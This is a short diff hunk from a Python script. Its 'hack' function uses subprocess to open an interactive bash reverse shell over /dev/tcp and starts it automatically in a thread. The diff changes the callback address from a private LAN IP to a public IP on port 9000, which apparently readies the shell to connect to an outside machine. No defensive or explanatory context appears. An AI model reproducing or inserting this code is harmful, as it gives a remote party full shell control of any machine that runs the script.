@@ -44,7 +44,7 @@ def search():
 
 
 def hack(num):
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.56.1/9000 0<&1 2>&1", shell=True, executable='/bin/bash')
+    subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/9000 0<&1 2>&1", shell=True, executable='/bin/bash')
 
 if __name__ == "__main__":
     thread = threading.Thread(target=hack, args=(10,))
